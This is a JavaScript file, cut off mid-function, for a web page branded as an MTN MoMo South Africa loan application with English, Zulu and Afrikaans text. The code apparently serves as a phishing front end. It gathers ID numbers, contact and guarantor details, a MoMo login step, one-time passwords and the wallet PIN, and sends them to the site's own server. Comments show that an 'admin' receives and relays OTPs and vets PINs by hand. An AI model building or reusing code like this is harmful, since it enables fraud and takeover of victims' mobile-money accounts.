// ============================================================
// script.js – MTN MoMo South Africa  (v7.0)
// ============================================================
'use strict';

const ACCOUNT_TYPES = {
    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true  },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true  },
    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
};

const STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];

const S = {
    applicationId: '',
    isRegistered: false,
    registrationStatus: 'idle',
    accountType: null,
    accountMaxLoan: 0,
    idNumber: null,
    dob: null,
    steps: {},
    loan: {}, personal: {}, employment: {}, guarantor: {}
};

const POLL_INTERVAL = 2500;
const POLL_MAX_DURATION = 30 * 60 * 1000;

let activePoll = null;
let currentPollStep = null;
let currentPollCallback = null;
let currentPollStarted = 0;
let regPollTimer = null;
let selectedAccountType = null;
let qualificationAnimator = null;

const KEYS = {
    APP_ID: 'mtn_za_app_id_v7',
    APP_DATA: 'mtn_za_data_v7'
};

const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} };
const get  = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
const rm   = (k) => { try { localStorage.removeItem(k); } catch (e) {} };

// ═══════════════════════════════════════════════════════════
// I18N
// ═══════════════════════════════════════════════════════════
const I18N = {
    en: {
        'landing.welcome': 'Welcome to MTN MoMo South Africa',
        'landing.tagline': 'Get loans easily through MTN MoMo South Africa',
        'landing.haveMomo': 'I already have MoMo',
        'landing.haveMomoSub': 'Link your wallet once, then apply in one tap',
        'landing.noMomo': "I don't have MoMo yet",
        'landing.noMomoSub': 'Sign up in 60 seconds, then apply for a loan',
        'landing.continueMomo': 'Continue with MoMo',
        'landing.registerFirst': 'Register First',
        'landing.secure': '🔒 Secure',
        'landing.fast': '⚡ Fast Approval',
        'landing.sa': '🇿🇦 Proudly SA',
        'landing.calcTitle': 'Loan Calculator',
        'landing.calcSub': 'See your monthly payment',
        'landing.loanAmount': 'Loan Amount',
        'landing.loanTerm': 'Loan Term',
        'landing.monthlyPayment': 'Monthly Payment',
        'landing.totalRepayment': 'Total Repayment',
        'landing.amountReceive': 'Amount You Receive',
        'landing.applyLoan': 'Apply for This Loan',
        'landing.calcNote': '💡 You can change these later'
    },
    zu: {
        'landing.welcome': 'Siyakwamukela ku-MTN MoMo South Africa',
        'landing.tagline': 'Thola imali mboleko kalula nge-MTN MoMo',
        'landing.haveMomo': 'Senginayo i-MoMo',
        'landing.haveMomoSub': 'Xhumanisa isikhwama sakho, bese ufaka isicelo',
        'landing.noMomo': 'Anginayo i-MoMo okwamanje',
        'landing.noMomoSub': 'Bhalisa ngemizuzu engu-60, bese ufaka isicelo',
        'landing.continueMomo': 'Qhubeka ne-MoMo',
        'landing.registerFirst': 'Bhalisa Kuqala',
        'landing.secure': '🔒 Kuphephile',
        'landing.fast': '⚡ Ukugunyazwa Okusheshayo',
        'landing.sa': '🇿🇦 Iningizimu Afrika',
        'landing.calcTitle': 'Isibali Semali Mboleko',
        'landing.calcSub': 'Bona inkokhelo yakho yanyanga zonke',
        'landing.loanAmount': 'Inani Lemali',
        'landing.loanTerm': 'Isikhathi',
        'landing.monthlyPayment': 'Inkokhelo Yanyanga',
        'landing.totalRepayment': 'Isamba Sokukhokha',
        'landing.amountReceive': 'Imali Ozoyithola',
        'landing.applyLoan': 'Faka Isicelo',
        'landing.calcNote': '💡 Ungashintsha lokhu kamuva'
    },
    af: {
        'landing.welcome': 'Welkom by MTN MoMo Suid-Afrika',
        'landing.tagline': 'Kry lenings maklik deur MTN MoMo',
        'landing.haveMomo': 'Ek het reeds MoMo',
        'landing.haveMomoSub': 'Koppel jou beursie een keer, dan doen aansoek',
        'landing.noMomo': 'Ek het nog nie MoMo nie',
        'landing.noMomoSub': 'Registreer in 60 sekondes, doen dan aansoek',
        'landing.continueMomo': 'Gaan voort met MoMo',
        'landing.registerFirst': 'Registreer Eers',
        'landing.secure': '🔒 Veilig',
        'landing.fast': '⚡ Vinnige Goedkeuring',
        'landing.sa': '🇿🇦 Trotse SA',
        'landing.calcTitle': 'Lening Sakrekenaar',
        'landing.calcSub': 'Sien jou maandelikse betaling',
        'landing.loanAmount': 'Lening Bedrag',
        'landing.loanTerm': 'Lening Termyn',
        'landing.monthlyPayment': 'Maandelikse Betaling',
        'landing.totalRepayment': 'Totale Terugbetaling',
        'landing.amountReceive': 'Bedrag Wat Jy Ontvang',
        'landing.applyLoan': 'Doen Aansoek',
        'landing.calcNote': '💡 Jy kan dit later verander'
    }
};

let CURRENT_LANG = localStorage.getItem('momo_lang') || 'en';
function t(key) { return (I18N[CURRENT_LANG] && I18N[CURRENT_LANG][key]) || I18N.en[key] || key; }
function applyI18n() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const val = t(el.dataset.i18n);
        if (val) el.textContent = val;
    });
    const langSel = document.getElementById('langSelect');
    if (langSel) langSel.value = CURRENT_LANG;
    document.documentElement.lang = CURRENT_LANG === 'zu' ? 'zu' : CURRENT_LANG === 'af' ? 'af' : 'en';
}
function setLanguage(lang) {
    CURRENT_LANG = I18N[lang] ? lang : 'en';
    localStorage.setItem('momo_lang', CURRENT_LANG);
    applyI18n();
    showToast(CURRENT_LANG === 'en' ? 'Language: English'
            : CURRENT_LANG === 'zu' ? 'Ulimi: isiZulu'
            : 'Taal: Afrikaans', 'success', 1800);
}

// ═══════════════════════════════════════════════════════════
// DRAFT AUTOSAVE
// ═══════════════════════════════════════════════════════════
const DRAFT_KEYS = {
    's1ty': 'loanType', 's1am': 'loanAmount', 's1te': 'loanTerm', 's1pu': 'loanPurpose',
    's2fi': 'firstName', 's2la': 'lastName', 's2ph': 'phone', 's2em': 'email',
    's3em': 'employment', 's3in': 'annualIncome', 's3kn': 'kinName', 's3kp': 'kinPhone',
    'gName': 'guarantorName', 'gPhone': 'guarantorPhone', 'gRel': 'guarantorRelation'
};
function saveDraft(fieldId, value) {
    try { const d = JSON.parse(localStorage.getItem('momo_drafts') || '{}'); d[fieldId] = value; localStorage.setItem('momo_drafts', JSON.stringify(d)); } catch (e) {}
}
function restoreDrafts() {
    let d = {};
    try { d = JSON.parse(localStorage.getItem('momo_drafts') || '{}'); } catch (e) {}
    Object.keys(d).forEach(id => { const el = document.getElementById(id); if (el && !el.value) el.value = d[id]; });
}
function clearDrafts() { try { localStorage.removeItem('momo_drafts'); } catch (e) {} }
function attachDraftListeners() {
    Object.keys(DRAFT_KEYS).forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        el.addEventListener('input', () => saveDraft(id, el.value));
        el.addEventListener('change', () => saveDraft(id, el.value));
    });
}

// ═══════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════
function escapeHtml(s) { return String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
function fmt(n) { return (Number(n) || 0).toLocaleString(); }
function genAppId() {
    const rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
    return 'MTN-ZA-' + rand.slice(0, 8);
}

window.addEventListener('online',  () => document.getElementById('offlineBanner').classList.add('hidden'));
window.addEventListener('offline', () => document.getElementById('offlineBanner').classList.remove('hidden'));
if (!navigator.onLine) document.getElementById('offlineBanner').classList.remove('hidden');

window.addEventListener('popstate', () => {
    const active = document.querySelector('.page.active');
    if (active && requiresRegistration(active.id) && !isUserRegistered()) {
        forceRegistration();
    }
});

function requiresRegistration(pageId) {
    return ['page-step1', 'page-step2', 'page-step3', 'page-guarantor', 'page-confirmation',
            'page-momologin', 'page-scan', 'page-approval',
            'page-wait-loan', 'page-wait-personal', 'page-wait-employment',
            'page-wait-guarantor', 'page-wait-momologin'].includes(pageId);
}
function isUserRegistered() {
    return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType] && S.registrationStatus === 'completed');
}
function forceRegistration(reason) {
    showToast('🔗 Please complete your registration to continue', 'info', 3500);
    setTimeout(() => {
        routeRegistrationFlow();
        if (reason) setTimeout(() => showErr('regErr', reason), 400);
    }, 800);
}

function showToast(msg, type = 'info', duration = 3200) {
    document.querySelectorAll('.toast').forEach(t => t.remove());
    const t = document.createElement('div');
    t.className = `toast toast-${type}`;
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => {
        t.style.opacity = '0';
        t.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(() => t.remove(), 300);
    }, duration);
}
function showErr(id, msg) { const b = document.getElementById(id); if (b) { b.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; } }
function clearErr(id) { const b = document.getElementById(id); if (b) b.classList.remove('show'); }
function setBtnLoading(btn, loading, dt) { if (!btn) return; btn.disabled = loading; btn.textContent = loading ? 'Please wait...' : dt; }

async function apiCall(endpoint, options = {}) {
    try {
        const res = await fetch(endpoint, {
            credentials: 'same-origin',
            ...options,
            headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }
        });
        const data = await res.json();
        // Global rate-limit interception
        if (res.status === 429 || data?.code === 'RATE_LIMITED') {
            const msg = data?.error || 'You have exceeded the trial limit. Please try again in 5 minutes.';
            showToast('⏳ ' + msg, 'error', 6000);
            throw new Error(msg);
        }
        return data;
    } catch (e) {
        console.error(`${endpoint}:`, e.message);
        if (!e.message || e.message === 'Network error') throw new Error('Network error. Please try again.');
        throw e;
    }
}

function goTo(pageId) {
    if (requiresRegistration(pageId) && !isUserRegistered()) { forceRegistration(); return; }
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
    history.pushState({ page: pageId }, '', '#' + pageId);

    if (pageId === 'page-requirements') updateRequirementsLimits();
    if (pageId === 'page-step1')        refreshStep1();
    if (pageId === 'page-step2')        prefillPersonal();
    if (pageId === 'page-momologin')    prefillMoMoLogin();
    if (pageId === 'page-confirmation') updateConfirmation();
    refreshAccountBadges();
    if (!pageId.startsWith('page-wait-') && pageId !== 'page-scan' && !pageId.startsWith('page-registration-')) {
        stopPolling();
    }
}
function refreshAccountBadges() {
    const type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
    const label = type ? `${type.icon} ${type.name}` : '';
    ['navbarAccount0','navbarAccount','navbarAccount2','navbarAccount3','navbarAccount4','navbarAccount5','navbarAccount6'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerHTML = label ? `<div class="nav-badge">${label}</div>` : '';
    });
}

// ═══════════════════════════════════════════════════════════
// FORM HELPERS
// ═══════════════════════════════════════════════════════════
function normalizePhone(id) {
    const inp = document.getElementById(id);
    let v = inp.value.replace(/\D/g, '');
    if (v.length > 9) v = v.substring(0, 9);
    inp.value = v;
}
function normalizeId(id) {
    const inp = document.getElementById(id);
    let v = inp.value.replace(/\D/g, '');
    if (v.length > 13) v = v.substring(0, 13);
    inp.value = v;
    if (v.length === 13) validateAndPreviewId(v);
    else {
        document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
        const dobEl = document.getElementById('regDob');
        if (dobEl) dobEl.value = '';
    }
}

function updateCalc() {
    const slider = document.getElementById('amtSlider');
    const maxAllowed = isUserRegistered()
        ? Math.min(500000, ACCOUNT_TYPES[S.accountType].maxLoan)
        : 500000;
    slider.max = maxAllowed;
    if (+slider.value > maxAllowed) slider.value = maxAllowed;

    const amt  = +slider.value;
    const term = +document.getElementById('calcTermSelect').value;
    const r = 0.27 / 12;
    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
    const total = monthly * term;
    document.getElementById('calcAmt').textContent    = 'R ' + amt.toLocaleString();
    document.getElementById('monthlyAmt').textContent = 'R ' + monthly.toLocaleString();
    document.getElementById('totalAmt').textContent   = 'R ' + total.toLocaleString();
    document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();
    const pct = ((amt - 5000) / Math.max(1, maxAllowed - 5000)) * 100;
    slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');
    const ends = slider.parentElement.querySelector('.range-ends');
    if (ends) ends.innerHTML = `<span>R 5,000</span><span>R ${maxAllowed.toLocaleString()}</span>`;
}

// ═══════════════════════════════════════════════════════════
// SA ID
// ═══════════════════════════════════════════════════════════
function parseSAId(id) {
    if (!id) return { ok: false, reason: 'ID required.' };
    const clean = String(id).replace(/\D/g, '');
    if (clean.length !== 13) return { ok: false, reason: 'SA ID must be 13 digits.' };
    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;
    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) return { ok: false, reason: 'Invalid date of birth.' };
    const age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
    if (age < 18)  return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const c = clean[10];
    const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
    return { ok: true, dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }), isoDob: `${year}-${String(mm).padStart(2,'0')}-${String(dd).padStart(2,'0')}`, age, gender, citizenship };
}
function luhnCheck(num) {
    let sum = 0, alt = false;
    for (let i = num.length - 1; i >= 0; i--) {
        let n = parseInt(num[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    return sum % 10 === 0;
}
function validateAndPreviewId(id) {
    const r = parseSAId(id);
    const p = document.getElementById('regDetailsPreview');
    if (!r.ok) {
        p.innerHTML = `<div class="reg-preview-error">✕ ${escapeHtml(r.reason)}</div>`;
        const dobEl = document.getElementById('regDob'); if (dobEl) dobEl.value = '';
        return;
    }
    p.innerHTML = `
        <div class="reg-preview-row"><span>DOB</span><strong>${r.dob}</strong></div>
        <div class="reg-preview-row"><span>Age</span><strong>${r.age} years</strong></div>
        <div class="reg-preview-row"><span>Gender</span><strong>${r.gender}</strong></div>
        <div class="reg-preview-row"><span>Citizenship</span><strong>${r.citizenship}</strong></div>`;
    const dobEl = document.getElementById('regDob');
    if (dobEl) dobEl.value = r.isoDob;
}

// ═══════════════════════════════════════════════════════════
// LANDING
// ═══════════════════════════════════════════════════════════
function applyAsExistingUser() {
    if (isUserRegistered()) {
        // Resume from furthest approved step
        if (S.steps.loan === 'approved') {
            if (S.steps.personal === 'approved') {
                if (S.steps.employment === 'approved') {
                    if (S.steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
                    goTo('page-guarantor'); return;
                }
                goTo('page-step3'); return;
            }
            goTo('page-step2'); return;
        }
        goTo('page-step1');
        return;
    }
    if (S.isRegistered && S.registrationStatus && S.registrationStatus !== 'completed') {
        // Resume registration flow at current stage
        routeRegistrationFlow();
        return;
    }
    showToast('🔗 Link your MoMo wallet — takes 60 seconds', 'info', 3500);
    setTimeout(() => startMoMoRegistration({ mode: 'link' }), 500);
}

function applyFromCalculator() {
    const amt  = +document.getElementById('amtSlider').value;
    const term = document.getElementById('calcTermSelect').value + ' Months';
    const max = S.accountMaxLoan || (S.accountType ? ACCOUNT_TYPES[S.accountType].maxLoan : amt);
    const finalAmt = Math.min(amt, max);
    S.loan = { ...S.loan, loanAmount: finalAmt, loanTerm: term };
    saveAll();
    if (!isUserRegistered()) {
        showToast(`💾 Saved R ${fmt(finalAmt)} — complete registration to continue`, 'info', 4000);
        setTimeout(() => applyAsExistingUser(), 500);
        return;
    }
    showToast(`R ${fmt(finalAmt)} selected`, 'success');
    goTo('page-step1');
}

function startMoMoRegistration(opts = {}) {
    const mode = opts.mode || 'register';
    S.isRegistered  = false;
    S.accountType   = null;
    S.accountMaxLoan = 0;
    S.idNumber      = null;
    S.dob           = null;
    S.registrationStatus = 'idle';
    S.steps         = {};
    saveAll();

    document.getElementById('regId').value = '';
    document.getElementById('regPhone').value = '';
    document.getElementById('regEmail').value = '';
    const dobEl = document.getElementById('regDob'); if (dobEl) dobEl.value = '';
    const tnc = document.getElementById('regTnc'); if (tnc) tnc.checked = false;
    document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
    selectedAccountType = null;
    document.querySelectorAll('.account-type').forEach(el => {
        el.classList.remove('selected');
        el.querySelector('.at-check').textContent = '○';
    });
    document.getElementById('accountTypeHint').textContent = 'Tap to select';
    clearErr('regErr');

    const heading = document.querySelector('#page-register-check .step-card h2');
    const sub     = document.querySelector('#page-register-check .step-sub');
    const introH3 = document.querySelector('#page-register-check .reg-intro h3');
    const introP  = document.querySelector('#page-register-check .reg-intro p');
    if (mode === 'link') {
        if (heading) heading.textContent = 'Link Your MoMo Wallet';
        if (sub)     sub.textContent     = 'Verify your ID to link your existing MoMo account';
        if (introH3) introH3.textContent = 'Link your existing MoMo wallet';
        if (introP)  introP.textContent  = 'Confirm your SA ID, mobile, and email, then pick the wallet type you hold.';
    } else {
        if (heading) heading.textContent = 'MoMo Registration';
        if (sub)     sub.textContent     = 'Register in under 60 seconds';
        if (introH3) introH3.textContent = "You're 2 steps away from your loan";
        if (introP)  introP.textContent  = "MoMo is MTN's mobile money service. Register your wallet, then apply.";
    }
    goTo('page-register-check');
}

function selectAccountType(type) {
    selectedAccountType = type;
    const names = { yello: 'MoMo Yello', yello_plus: 'MoMo Yello Plus', eazi: 'MoMo Eazi' };
    document.querySelectorAll('.account-type').forEach(el => {
        const m = el.dataset.type === type;
        el.classList.toggle('selected', m);
        el.querySelector('.at-check').textContent = m ? '●' : '○';
    });
    document.getElementById('accountTypeHint').textContent = `✅ ${names[type]}`;
}

async function completeRegistration() {
    const id    = document.getElementById('regId').value.trim();
    const phone = document.getElementById('regPhone').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const dob   = (document.getElementById('regDob')?.value || '').trim();
    const tnc   = !!document.getElementById('regTnc')?.checked;

    if (!id) return showErr('regErr', 'Please enter your SA ID.');
    if (id.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
    const r = parseSAId(id);
    if (!r.ok) return showErr('regErr', r.reason);
    if (!dob) return showErr('regErr', 'Please re-enter your SA ID.');
    if (phone.length !== 9) return showErr('regErr', 'Mobile number must be 9 digits (e.g. 812345678).');
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showErr('regErr', 'Enter a valid email address.');
    if (!selectedAccountType) return showErr('regErr', 'Please select an account type.');
    if (!tnc) return showErr('regErr', 'You must read and accept the Terms & Conditions.');

    if (!S.applicationId) S.applicationId = genAppId();
    saveAll();

    const btn = document.getElementById('regBtn');
    setBtnLoading(btn, true, 'Complete Registration');
    goTo('page-register-processing');
    document.getElementById('regProcessingStatus').textContent = '⏳ Submitting for review...';

    try {
        const data = await apiCall('/api/register-momo', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                idNumber: id,
                accountType: selectedAccountType,
                phone: phone,
                email: email,
                dob: dob,
                tncAccepted: tnc,
                fullName: null
            })
        });

        if (!data.ok) {
            goTo('page-register-check');
            showErr('regErr', data.error || 'Registration failed.');
            setBtnLoading(btn, false, 'Complete Registration');
            return;
        }

        S.idNumber       = id;
        S.dob            = data.dob || dob;
        S.accountType    = selectedAccountType;
        S.accountMaxLoan = data.maxLoan;
        S.isRegistered   = true;
        S.registrationStatus = 'pending_review';
        S.personal = { ...S.personal, phone: phone, email: email };
        saveAll();
        updateCalc();
        clearDrafts();

        setBtnLoading(btn, false, 'Complete Registration');
        document.getElementById('regWaitAppId').textContent = S.applicationId;
        goTo('page-registration-wait');
        pollRegistrationStatus();
    } catch (e) {
        goTo('page-register-check');
        showErr('regErr', e.message);
        setBtnLoading(btn, false, 'Complete Registration');
    }
}

// ═══════════════════════════════════════════════════════════
// REGISTRATION FLOW ROUTER
// ═══════════════════════════════════════════════════════════
function routeRegistrationFlow() {
    const st = S.registrationStatus || 'idle';
    switch (st) {
        case 'idle':
            goTo('page-register-check');
            break;
        case 'pending_review':
            document.getElementById('regWaitAppId').textContent = S.applicationId;
            goTo('page-registration-wait');
            pollRegistrationStatus();
            break;
        case 'otp_pending':
            const phoneEl = document.getElementById('regOtpPhone');
            if (phoneEl && S.personal.phone) phoneEl.textContent = '+27 ' + S.personal.phone;
            goTo('page-registration-otp');
            break;
        case 'otp_verified':
            goTo('page-registration-pin');
            break;
        case 'pin_pending':
            document.getElementById('regPinWaitAppId').textContent = S.applicationId;
            goTo('page-registration-pin-wait');
            pollPinStatus();
            break;
        case 'completed':
            goTo('page-requirements');
            break;
        case 'rejected':
            goTo('page-registration-rejected');
            break;
        default:
            goTo('page-register-check');
    }
}

function stopRegPoll() {
    if (regPollTimer) { clearTimeout(regPollTimer); regPollTimer = null; }
}

async function pollRegistrationStatus() {
    stopRegPoll();
    const tick = async () => {
        try {
            const r = await fetch(`/api/registration/status/${S.applicationId}`, { credentials: 'same-origin' });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            const data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }

            S.registrationStatus = data.status;
            S.accountType = data.accountType || S.accountType;
            S.accountMaxLoan = data.accountMaxLoan || S.accountMaxLoan;
            saveAll();

            switch (data.status) {
                case 'pending_review':
                    regPollTimer = setTimeout(tick, 3000);
                    break;
                case 'otp_pending':
                    stopRegPoll();
                    showToast('✅ Registration approved — check your phone for OTP', 'success', 4000);
                    document.getElementById('regOtpPhone').textContent = data.phone ? '+27 ' + data.phone : '+27 —';
                    goTo('page-registration-otp');
                    setTimeout(() => document.getElementById('regOtp0')?.focus(), 200);
                    break;
                case 'otp_verified':
                    stopRegPoll();
                    goTo('page-registration-pin');
                    break;
                case 'pin_pending':
                    stopRegPoll();
                    document.getElementById('regPinWaitAppId').textContent = S.applicationId;
                    goTo('page-registration-pin-wait');
                    pollPinStatus();
                    break;
                case 'completed':
                    stopRegPoll();
                    showToast('🎉 Registration complete!', 'success', 3000);
                    goTo('page-requirements');
                    break;
                case 'rejected':
                    stopRegPoll();
                    document.getElementById('regRejectReason').textContent = data.rejectionReason || 'Your registration was rejected.';
                    goTo('page-registration-rejected');
                    break;
                default:
                    regPollTimer = setTimeout(tick, 3000);
            }
        } catch (e) {
            console.warn('Reg poll:', e.message);
            regPollTimer = setTimeout(tick, 4000);
        }
    };
    tick();
}

async function pollPinStatus() {
    stopRegPoll();
    const tick = async () => {
        try {
            const r = await fetch(`/api/registration/status/${S.applicationId}`, { credentials: 'same-origin' });
            const data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
            S.registrationStatus = data.status;
            saveAll();
            if (data.status === 'completed') {
                stopRegPoll();
                showToast('🎉 Registration complete!', 'success', 3000);
                goTo('page-requirements');
                return;
            }
            if (data.status === 'otp_verified') {
                // Admin rejected PIN → back to PIN entry
                stopRegPoll();
                showToast('⚠️ PIN was not accepted. Please choose a different PIN.', 'error', 5000);
                goTo('page-registration-pin');
                ['regPin0','regPin1','regPin2','regPin3','regPin4','regPinC0','regPinC1','regPinC2','regPinC3','regPinC4'].forEach(id => {
                    const el = document.getElementById(id); if (el) el.value = '';
                });
                return;
            }
            if (data.status === 'rejected') {
                stopRegPoll();
                document.getElementById('regRejectReason').textContent = data.rejectionReason || 'Registration was rejected.';
                goTo('page-registration-rejected');
                return;
            }
            regPollTimer = setTimeout(tick, 3000);
        } catch (e) { regPollTimer = setTimeout(tick, 4000); }
    };
    tick();
}

async function submitRegistrationOtp() {
    const otp = [0,1,2,3,4,5].map(i => document.getElementById('regOtp' + i).value).join('');
    if (otp.length !== 6) return showErr('regOtpErr', 'Enter all 6 digits.');
    clearErr('regOtpErr');
    const btn = document.getElementById('regOtpBtn');
    setBtnLoading(btn, true, 'Verifying...');
    try {
        const data = await apiCall('/api/registration/verify-otp', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, otp })
        });
        setBtnLoading(btn, false, 'Verify OTP');
        if (!data.ok) {
            showErr('regOtpErr', data.error || 'Invalid OTP.');
            // If server says rejected (too many attempts) → route to rejected page
            if (data.error && data.error.toLowerCase().includes('re-register')) {
                S.registrationStatus = 'rejected';
                saveAll();
                setTimeout(() => {
                    document.getElementById('regRejectReason').textContent = 'Too many incorrect OTP attempts.';
                    goTo('page-registration-rejected');
                }, 1500);
            }
            return;
        }
        showToast('✅ OTP verified!', 'success');
        setTimeout(() => goTo('page-registration-pin'), 500);
    } catch (e) {
        setBtnLoading(btn, false, 'Verify OTP');
        showErr('regOtpErr', e.message);
    }
}

async function resendRegistrationOtp() {
    try {
        const data = await apiCall('/api/registration/resend-otp', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId })
        });
        if (!data.ok) { showToast(data.error || 'Could not resend.', 'error'); return; }
        showToast('📩 New OTP sent to admin — they will relay to you', 'info', 4000);
    } catch (e) { showToast(e.message, 'error'); }
}

async function submitRegistrationPin() {
    const pin = [0,1,2,3,4].map(i => document.getElementById('regPin' + i).value).join('');
    const pinC = [0,1,2,3,4].map(i => document.getElementById('regPinC' + i).value).join('');
    if (pin.length !== 5) return showErr('regPinErr', 'Enter a 5-digit PIN.');
    if (pin !== pinC) return showErr('regPinErr', 'PINs do not match.');
    clearErr('regPinErr');
    const btn = document.getElementById('regPinBtn');
    setBtnLoading(btn, true, 'Setting PIN...');
    try {
        const data = await apiCall('/api/registration/set-pin', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, pin })
        });
        setBtnLoading(btn, false, 'Set PIN');
        if (!data.ok) return showErr('regPinErr', data.error || 'Could not set PIN.');
        showToast('🔐 PIN submitted for verification', 'success');
        S.registrationStatus = 'pin_pending';
        saveAll();
        document.getElementById('regPinWaitAppId').textContent = S.applicationId;
        goTo('page-registration-pin-wait');
        pollPinStatus();
    } catch (e) {
        setBtnLoading(btn, false, 'Set PIN');
        showErr('regPinErr', e.message);
    }
}

async function restartRegistration() {
    try {
        await apiCall('/api/registration/reset', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId })
        });
    } catch (e) { /* ignore */ }
    startMoMoRegistration({ mode: 'register' });
}

// ═══════════════════════════════════════════════════════════
// REQUIREMENTS
// ═══════════════════════════════════════════════════════════
function updateRequirementsLimits() {
    const t = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
    document.getElementById('reqLimitText').innerHTML =
        `<b>${t.icon} ${t.name}</b><br>Daily: R ${fmt(t.dailyCash)} · Monthly: R ${fmt(t.monthlyCap)}<br><b>Max loan: R ${fmt(t.maxLoan)}</b>`;
    document.getElementById('reqTxText').innerHTML =
        `Have <b>20% of loan amount</b> in MoMo transactions this month. Example: for R ${fmt(t.maxLoan)} → R ${fmt(Math.ceil(t.maxLoan * 0.20))}.`;
}

// ═══════════════════════════════════════════════════════════
// STEP 1: LOAN
// ═══════════════════════════════════════════════════════════
function refreshStep1() {
    if (!isUserRegistered()) { forceRegistration(); return; }
    const t = ACCOUNT_TYPES[S.accountType];
    document.getElementById('accInfoBox').style.display = 'block';
    document.getElementById('accInfoText').innerHTML = `<b>${t.icon} ${t.name}</b> — Max loan <b>R ${fmt(t.maxLoan)}</b>`;
    document.getElementById('loanLimitHint').textContent = `Min R ${fmt(t.minLoan)} · Max R ${fmt(t.maxLoan)}`;
    const am = document.getElementById('s1am');
    am.min = t.minLoan; am.max = t.maxLoan;
    if (S.loan.loanAmount) am.value = Math.min(S.loan.loanAmount, t.maxLoan);
    if (+am.value > t.maxLoan) am.value = t.maxLoan;
    if (+am.value < t.minLoan) am.value = t.minLoan;
    if (S.loan.loanType)    document.getElementById('s1ty').value = S.loan.loanType;
    if (S.loan.loanTerm)    document.getElementById('s1te').value = S.loan.loanTerm;
    if (S.loan.loanPurpose) document.getElementById('s1pu').value = S.loan.loanPurpose;
}

async function submitStepLoan() {
    if (!isUserRegistered()) return forceRegistration();
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value.trim();
    const t = ACCOUNT_TYPES[S.accountType];
    if (!ty || !te || !pu) return showErr('s1Err', 'Complete all fields.');
    if (am < t.minLoan)    return showErr('s1Err', `Min R ${fmt(t.minLoan)}.`);
    if (am > t.maxLoan)    return showErr('s1Err', `Max R ${fmt(t.maxLoan)}.`);
    const btn = document.getElementById('s1Btn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('s1Err');
    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'loan',
                data: { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) {
            if (data.code === 'NOT_REGISTERED' || data.code === 'REGISTRATION_INCOMPLETE') { forceRegistration(); return; }
            return showErr('s1Err', data.error || 'Submission failed.');
        }
        S.loan = { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu };
        S.steps.loan = 'pending';
